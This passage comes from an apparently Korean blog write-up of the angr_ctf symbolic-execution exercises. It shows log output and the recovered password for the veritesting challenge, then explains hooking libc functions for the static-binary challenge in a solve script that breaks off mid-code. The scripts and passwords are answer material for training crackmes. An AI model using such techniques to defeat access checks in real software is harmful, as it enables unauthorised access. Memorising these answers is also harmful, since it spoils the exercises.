will cope <span class="hljs-keyword">with</span> this by generating an unconstrained symbolic variable <span class="hljs-keyword">and</span> continuing. You can resolve this by:WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">00</span>,<span class="hljs-number">061</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">1</span>) setting a value to the initial stateWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">00</span>,<span class="hljs-number">061</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">2</span>) adding the state option ZERO_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to make unknown regions hold nullWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">00</span>,<span class="hljs-number">061</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">3</span>) adding the state option SYMBOL_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to suppress these messages.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">00</span>,<span class="hljs-number">061</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register edi <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x80486c1</span> (__libc_csu_init+<span class="hljs-number">0x1</span> <span class="hljs-keyword">in</span> <span class="hljs-number">12</span>_angr_veritesting (<span class="hljs-number">0x80486c1</span>))WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">00</span>,<span class="hljs-number">062</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register ebx <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x80486c3</span> (__libc_csu_init+<span class="hljs-number">0x3</span> <span class="hljs-keyword">in</span> <span class="hljs-number">12</span>_angr_veritesting (<span class="hljs-number">0x80486c3</span>))WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">00</span>,<span class="hljs-number">073</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register es <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x0</span> (<span class="hljs-keyword">not</span> part of a loaded object)WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">00</span>,<span class="hljs-number">073</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register gs <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x0</span> (<span class="hljs-keyword">not</span> part of a loaded object)Deprecation warning: Use self.model.get_any_node() instead of get_any_nodeWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">00</span>,<span class="hljs-number">103</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register es <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x0</span> (<span class="hljs-keyword">not</span> part of a loaded object)WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">00</span>,<span class="hljs-number">103</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register gs <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x0</span> (<span class="hljs-keyword">not</span> part of a loaded object)WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">00</span>,<span class="hljs-number">155</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register es <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x0</span> (<span class="hljs-keyword">not</span> part of a loaded object)WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">00</span>,<span class="hljs-number">155</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register gs <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x0</span> (<span class="hljs-keyword">not</span> part of a loaded object)WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">00</span>,<span class="hljs-number">171</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register es <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x0</span> (<span class="hljs-keyword">not</span> part of a loaded object)WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">00</span>,<span class="hljs-number">172</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register gs <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x0</span> (<span class="hljs-keyword">not</span> part of a loaded object)WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">00</span>,<span class="hljs-number">204</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register es <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x0</span> (<span class="hljs-keyword">not</span> part of a loaded object)WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">00</span>,<span class="hljs-number">204</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register gs <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x0</span> (<span class="hljs-keyword">not</span> part of a loaded object)WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">00</span>,<span class="hljs-number">354</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register es <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x0</span> (<span class="hljs-keyword">not</span> part of a loaded object)WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">00</span>,<span class="hljs-number">354</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register gs <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x0</span> (<span class="hljs-keyword">not</span> part of a loaded object)WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">00</span>,<span class="hljs-number">451</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register es <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x0</span> (<span class="hljs-keyword">not</span> part of a loaded object)WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">00</span>,<span class="hljs-number">452</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register gs <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x0</span> (<span class="hljs-keyword">not</span> part of a loaded object)WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">00</span>,<span class="hljs-number">490</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register es <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x0</span> (<span class="hljs-keyword">not</span> part of a loaded object)WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">00</span>,<span class="hljs-number">491</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register gs <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x0</span> (<span class="hljs-keyword">not</span> part of a loaded object)WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">00</span>,<span class="hljs-number">605</span> | angr.sim_manager | Cannot find states <span class="hljs-keyword">with</span> common history line to merge. Fall back to the naive merging strategy <span class="hljs-keyword">and</span> merge all states.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">01</span>,<span class="hljs-number">222</span> | angr.sim_manager | Cannot find states <span class="hljs-keyword">with</span> common history line to merge. Fall back to the naive merging strategy <span class="hljs-keyword">and</span> merge all states.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">01</span>,<span class="hljs-number">812</span> | angr.sim_manager | Cannot find states <span class="hljs-keyword">with</span> common history line to merge. Fall back to the naive merging strategy <span class="hljs-keyword">and</span> merge all states.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">02</span>,<span class="hljs-number">404</span> | angr.sim_manager | Cannot find states <span class="hljs-keyword">with</span> common history line to merge. Fall back to the naive merging strategy <span class="hljs-keyword">and</span> merge all states.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">03</span>,<span class="hljs-number">022</span> | angr.sim_manager | Cannot find states <span class="hljs-keyword">with</span> common history line to merge. Fall back to the naive merging strategy <span class="hljs-keyword">and</span> merge all states.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">03</span>,<span class="hljs-number">629</span> | angr.sim_manager | Cannot find states <span class="hljs-keyword">with</span> common history line to merge. Fall back to the naive merging strategy <span class="hljs-keyword">and</span> merge all states.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">04</span>,<span class="hljs-number">243</span> | angr.sim_manager | Cannot find states <span class="hljs-keyword">with</span> common history line to merge. Fall back to the naive merging strategy <span class="hljs-keyword">and</span> merge all states.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">04</span>,<span class="hljs-number">888</span> | angr.sim_manager | Cannot find states <span class="hljs-keyword">with</span> common history line to merge. Fall back to the naive merging strategy <span class="hljs-keyword">and</span> merge all states.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">05</span>,<span class="hljs-number">521</span> | angr.sim_manager | Cannot find states <span class="hljs-keyword">with</span> common history line to merge. Fall back to the naive merging strategy <span class="hljs-keyword">and</span> merge all states.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">06</span>,<span class="hljs-number">159</span> | angr.sim_manager | Cannot find states <span class="hljs-keyword">with</span> common history line to merge. Fall back to the naive merging strategy <span class="hljs-keyword">and</span> merge all states.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">06</span>,<span class="hljs-number">803</span> | angr.sim_manager | Cannot find states <span class="hljs-keyword">with</span> common history line to merge. Fall back to the naive merging strategy <span class="hljs-keyword">and</span> merge all states.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">07</span>,<span class="hljs-number">440</span> | angr.sim_manager | Cannot find states <span class="hljs-keyword">with</span> common history line to merge. Fall back to the naive merging strategy <span class="hljs-keyword">and</span> merge all states.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">08</span>,<span class="hljs-number">086</span> | angr.sim_manager | Cannot find states <span class="hljs-keyword">with</span> common history line to merge. Fall back to the naive merging strategy <span class="hljs-keyword">and</span> merge all states.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">08</span>,<span class="hljs-number">736</span> | angr.sim_manager | Cannot find states <span class="hljs-keyword">with</span> common history line to merge. Fall back to the naive merging strategy <span class="hljs-keyword">and</span> merge all states.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">09</span>,<span class="hljs-number">409</span> | angr.sim_manager | Cannot find states <span class="hljs-keyword">with</span> common history line to merge. Fall back to the naive merging strategy <span class="hljs-keyword">and</span> merge all states.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">10</span>,<span class="hljs-number">083</span> | angr.sim_manager | Cannot find states <span class="hljs-keyword">with</span> common history line to merge. Fall back to the naive merging strategy <span class="hljs-keyword">and</span> merge all states.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">10</span>,<span class="hljs-number">769</span> | angr.sim_manager | Cannot find states <span class="hljs-keyword">with</span> common history line to merge. Fall back to the naive merging strategy <span class="hljs-keyword">and</span> merge all states.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">11</span>,<span class="hljs-number">457</span> | angr.sim_manager | Cannot find states <span class="hljs-keyword">with</span> common history line to merge. Fall back to the naive merging strategy <span class="hljs-keyword">and</span> merge all states.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">12</span>,<span class="hljs-number">212</span> | angr.sim_manager | Cannot find states <span class="hljs-keyword">with</span> common history line to merge. Fall back to the naive merging strategy <span class="hljs-keyword">and</span> merge all states.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">12</span>,<span class="hljs-number">922</span> | angr.sim_manager | Cannot find states <span class="hljs-keyword">with</span> common history line to merge. Fall back to the naive merging strategy <span class="hljs-keyword">and</span> merge all states.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">13</span>,<span class="hljs-number">635</span> | angr.sim_manager | Cannot find states <span class="hljs-keyword">with</span> common history line to merge. Fall back to the naive merging strategy <span class="hljs-keyword">and</span> merge all states.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">14</span>,<span class="hljs-number">353</span> | angr.sim_manager | Cannot find states <span class="hljs-keyword">with</span> common history line to merge. Fall back to the naive merging strategy <span class="hljs-keyword">and</span> merge all states.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">15</span>,<span class="hljs-number">082</span> | angr.sim_manager | Cannot find states <span class="hljs-keyword">with</span> common history line to merge. Fall back to the naive merging strategy <span class="hljs-keyword">and</span> merge all states.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">15</span>,<span class="hljs-number">816</span> | angr.sim_manager | Cannot find states <span class="hljs-keyword">with</span> common history line to merge. Fall back to the naive merging strategy <span class="hljs-keyword">and</span> merge all states.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">16</span>,<span class="hljs-number">563</span> | angr.sim_manager | Cannot find states <span class="hljs-keyword">with</span> common history line to merge. Fall back to the naive merging strategy <span class="hljs-keyword">and</span> merge all states.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">17</span>,<span class="hljs-number">317</span> | angr.sim_manager | Cannot find states <span class="hljs-keyword">with</span> common history line to merge. Fall back to the naive merging strategy <span class="hljs-keyword">and</span> merge all states.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">18</span>,<span class="hljs-number">089</span> | angr.sim_manager | Cannot find states <span class="hljs-keyword">with</span> common history line to merge. Fall back to the naive merging strategy <span class="hljs-keyword">and</span> merge all states.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">18</span>,<span class="hljs-number">864</span> | angr.sim_manager | Cannot find states <span class="hljs-keyword">with</span> common history line to merge. Fall back to the naive merging strategy <span class="hljs-keyword">and</span> merge all states.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">19</span>,<span class="hljs-number">664</span> | angr.sim_manager | Cannot find states <span class="hljs-keyword">with</span> common history line to merge. Fall back to the naive merging strategy <span class="hljs-keyword">and</span> merge all states.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">20</span>,<span class="hljs-number">468</span> | angr.sim_manager | Cannot find states <span class="hljs-keyword">with</span> common history line to merge. Fall back to the naive merging strategy <span class="hljs-keyword">and</span> merge all states.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">21</span>,<span class="hljs-number">297</span> | angr.sim_manager | Cannot find states <span class="hljs-keyword">with</span> common history line to merge. Fall back to the naive merging strategy <span class="hljs-keyword">and</span> merge all states.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">13</span>:<span class="hljs-number">39</span>:<span class="hljs-number">22</span>,<span class="hljs-number">129</span> | angr.sim_manager | Cannot find states <span class="hljs-keyword">with</span> common history line to merge. Fall back to the naive merging strategy <span class="hljs-keyword">and</span> merge all states.<span class="hljs-string">b&apos;OQSUWYACEGIKMOQSUWYACEGIKMOQSUWY&apos;</span>j0ker@angr:~/angr_ctf/dist$ ./<span class="hljs-number">12</span>_angr_veritesting Enter the password: OQSUWYACEGIKMOQSUWYACEGIKMOQSUWYGood Job.</code></pre><h1 id="13-angr-static-binary"><a href="#13-angr-static-binary" class="headerlink" title="13_angr_static_binary"></a>13_angr_static_binary</h1><p><img src="/2021/08/25/j0ker/angr_part5/5.png" alt="Untitled"></p><p>&#xC774;&#xBC88; &#xBB38;&#xC81C;&#xB294; &#xC5BC;&#xD54F; &#xBCF4;&#xAE30;&#xC5D0;&#xB294; &#xD2B9;&#xBCC4;&#xD55C;&#xAC8C; &#xC5C6;&#xC5B4;&#xBCF4;&#xC774;&#xC9C0;&#xB9CC; static&#xD558;&#xAC8C; &#xCEF4;&#xD30C;&#xC77C;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xB9D0;&#xC740; &#xBB34;&#xC5C7;&#xC774;&#xB0D0;? &#xADF8;&#xB0E5; &#xBD84;&#xC11D;&#xC744; &#xB3CC;&#xB838;&#xB2E4;&#xAC00;&#xB294; &#xBA54;&#xBAA8;&#xB9AC;&#xAC00; &#xD130;&#xC838;&#xBC84;&#xB9B0;&#xB2E4;&#xB294; &#xC598;&#xAE30;&#xC8E0;. &#xC0AC;&#xC2E4; &#xC81C;&#xAC00; &#xC9C0;&#xAE08; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xC11C;&#xBC84;&#xB294; fandu&#xB2D8;&#xC774; &#xBE4C;&#xB824;&#xC8FC;&#xC2E0; &#xC11C;&#xBC84;&#xB77C; &#xD130;&#xC9C0;&#xB4E0; &#xB9D0;&#xB4E0; &#xD06C;&#xAC8C; &#xC0C1;&#xAD00;&#xC740; &#xC548;&#xD558;&#xC9C0;&#xB9CC; &#xD130;&#xC9C0;&#xBA74; &#xCC98;&#xB9DE;&#xC744;&#xAC70;&#xB780; &#xAC70;&#xB294; &#xD655;&#xC2E4;&#xD788; &#xC54C;&#xACE0; &#xC788;&#xC8E0;. &#xADF8;&#xB7EC;&#xB2C8;&#xAE4C; &#xC0AC;&#xB9AC;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xADFC;&#xB370; &#xBAA8;&#xB4E0; &#xD568;&#xC218;&#xB4E4;&#xC5D0; &#xB300;&#xD574; &#xC81C;&#xAC00; &#xC9C1;&#xC811; &#xD558;&#xB098;&#xD558;&#xB098; &#xB2E4; &#xD568;&#xC218; &#xB9CC;&#xB4E4;&#xC5B4;&#xC11C; &#xD6C4;&#xD0B9;&#xD560; &#xC218;&#xB294; &#xC5C6;&#xACA0;&#xC8E0;? angr&#xC5D0;&#xC11C;&#xB294; &#xC774;&#xB7F0; &#xD45C;&#xC900; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xC5D0; &#xC788;&#xB294; &#xD568;&#xC218;&#xB4E4;&#xC740; &#xAD6C;&#xD604;&#xD574;&#xB1A8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB561;&#xD050;!</p><p>angr &#xB808;&#xD3EC;&#xC5D0;&#xC11C; procedure&#xB85C; &#xB4E4;&#xC5B4;&#xAC00;&#xBA74; &#xC5C4;&#xCCAD; &#xB9CE;&#xC740; &#xD568;&#xC218;&#xB4E4;&#xC774; &#xAD6C;&#xD604;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/08/25/j0ker/angr_part5/6.png" alt="Untitled"></p><p>&#xBAB0;&#xB790;&#xB294;&#xB370; angr&#xAC00; &#xC790;&#xBC14;&#xB3C4; &#xC9C0;&#xC6D0;&#xD558;&#xB098; &#xBCF4;&#xB124;&#xC694;? &#xC81C; &#xD3C9;&#xC0DD; &#xC790;&#xBC14; &#xC5B4;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC744; &#xBD84;&#xC11D;&#xD560; &#xC77C;&#xC774; &#xC5C6;&#xC73C;&#xB2C8; &#xBCF4;&#xC9C0; &#xC54A;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.(&#xC81C;&#xBC1C; &#xC790;&#xBC14;&#xB294; &#xBCF4;&#xC9C0; &#xC54A;&#xAC8C; &#xD574;&#xC8FC;&#xC138;&#xC694; &#x3160;&#x3160;) &#xC554;&#xD2BC; &#xC708;&#xB3C4;&#xC6B0;&#xB3C4; &#xC9C0;&#xC6D0;&#xD558;&#xB2C8; &#xB098;&#xC911;&#xC5D0; &#xC694;&#xAE34;&#xD558;&#xAC8C; &#xC368;&#xBA39;&#xC744; &#xC218; &#xC788;&#xC744;&#xAC70; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC77C;&#xB2E8; &#xC774;&#xAC78;&#xB85C; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC; &#xD568;&#xC218;&#xB4E4;&#xC740; &#xD574;&#xACB0;&#xD560; &#xC218; &#xC788;&#xC744;&#xB4EF; &#xD569;&#xB2C8;&#xB2E4;. &#xBB38;&#xC81C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xC5D0;&#xC11C;&#xB294; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xC2E4;&#xD589;&#xD658;&#xACBD; &#xC138;&#xD305;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; <code>__libc_start_main</code>&#xB3C4; &#xD6C4;&#xD0B9;&#xD574;&#xC918;&#xC57C; &#xD55C;&#xB2E4;&#xB124;&#xC694;. </p><pre><code class="hljs python">project.hook_symbol(<span class="hljs-string">&apos;__isoc99_scanf&apos;</span>, angr.SIM_PROCEDURES[<span class="hljs-string">&apos;libc&apos;</span>][<span class="hljs-string">&apos;scanf&apos;</span>]())project.hook_symbol(<span class="hljs-string">&apos;printf&apos;</span>, angr.SIM_PROCEDURES[<span class="hljs-string">&apos;libc&apos;</span>][<span class="hljs-string">&apos;printf&apos;</span>]())project.hook_symbol(<span class="hljs-string">&apos;strcmp&apos;</span>, angr.SIM_PROCEDURES[<span class="hljs-string">&apos;libc&apos;</span>][<span class="hljs-string">&apos;strcmp&apos;</span>]())project.hook_symbol(<span class="hljs-string">&apos;puts&apos;</span>, angr.SIM_PROCEDURES[<span class="hljs-string">&apos;libc&apos;</span>][<span class="hljs-string">&apos;puts&apos;</span>]())project.hook_symbol(<span class="hljs-string">&apos;__libc_start_main&apos;</span>, angr.SIM_PROCEDURES[<span class="hljs-string">&apos;glibc&apos;</span>][<span class="hljs-string">&apos;__libc_start_main&apos;</span>]())</code></pre><p>&#xCCA8;&#xC5D0;&#xB294; &#xBB38;&#xC81C; &#xC548;&#xBCF4;&#xACE0; <code>scanf</code>&#xB294; &#xC9C1;&#xC811; &#xD074;&#xB798;&#xC2A4; &#xB9CC;&#xB4E4;&#xC5B4;&#xC92C;&#xB294;&#xB370;, &#xB098;&#xC911;&#xC5D0; &#xBCF4;&#xB2C8;&#xAE4C; &#xC778;&#xC790;&#xAC00; &#xD558;&#xB098;&#xC5EC;&#xC11C; &#xC0BD;&#xC9C8; &#xC880; &#xD588;&#xB124;&#xC694;. &#xC774;&#xB807;&#xAC8C;&#xB9CC; &#xC124;&#xC815;&#xD574;&#xC8FC;&#xBA74; &#xC774; &#xBB38;&#xC81C;&#xB3C4; &#xB05D;!</p><h2 id="sol13-py"><a href="#sol13-py" class="headerlink" title="sol13.py"></a>sol13.py</h2><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<span class="hljs-keyword">import</span> claripy<span class="hljs-keyword">import</span> sys<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">argv</span>):</span>  path_to_binary = argv[<span class="hljs-number">1</span>]  project = angr.Project(path_to_binary)  initial_state = project.factory.entry_state()  project.hook_symbol(<span class="hljs-string">&apos;__isoc99_scanf&apos;</span>, angr.SIM_PROCEDURES[<span class="hljs-string">&apos;libc&apos;</span>][<span class="hljs-string">&apos;scanf&apos;</span>]())  project.hook_symbol(<span class="hljs-string">&apos;printf&apos;</span>, angr.SIM_PROCEDURES[<span class="hljs-string">&apos;libc&apos;</span>][<span class="hljs-string">&apos;printf&apos;</span>]())  project.hook_symbol(<span class="hljs-string">&apos;strcmp&apos;</span>, angr.SIM_PROCEDURES[<span 